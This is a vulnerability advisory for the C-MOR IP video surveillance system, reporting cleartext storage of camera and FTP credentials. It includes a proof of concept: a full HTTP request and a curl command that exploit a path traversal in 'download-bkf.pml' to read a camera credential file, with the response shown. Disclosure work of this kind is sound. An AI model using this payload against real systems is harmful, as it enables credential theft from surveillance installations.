~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

The software product C-MOR is an IP video surveillance system.

The manufacturer describes the product as follows:

"With C-MOR video surveillance, it is possible to check your
surveillance over network and the Internet. You can access the live
view as well as previous recordings from any PC or mobile device.
C-MOR is managed and controlled over the C-MOR web interface.
IP settings, camera recording setup, user rights and so on are set
over the web without the installation of any software on the
client."[1]

Sensitive information is stored in cleartext.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

By analyzing the C-MOR system, it was found that sensitive information,
for example login credentials of cameras, is stored in clear text.

Thus, an attacker with file system access, for example exploiting a path
traversal attack (see SYSS-2024-025[3]), has access to the login data of
all configured cameras or the configured FTP server.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

By exploiting the path traversal attack in the backup download script
"download-bkf.pml", login credentials of cameras can be retrieved, as
the following HTTP request and the corresponding response demonstrate:

POST /download-bkf.pml HTTP/1.1
Host: <HOST>
Authorization: Basic <CREDENTIALS>
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Connection: close

bkf=../../../etc/ip.cam1


HTTP/1.1 200 OK
(...)

192.168.1.11
80
<USERNAME>
<PASSWORD>


This PoC attack can be performed using the following curl command:

curl -X POST -d 'bkf=../../../etc/ip.cam1' --user 
'<USERNAME>:<PASSWORD>' --ciphers 'DEFAULT:!DH' 
https://<HOST>/download-bkf.pml
192.168.1.11
80
<USERNAME>
<PASSWORD>
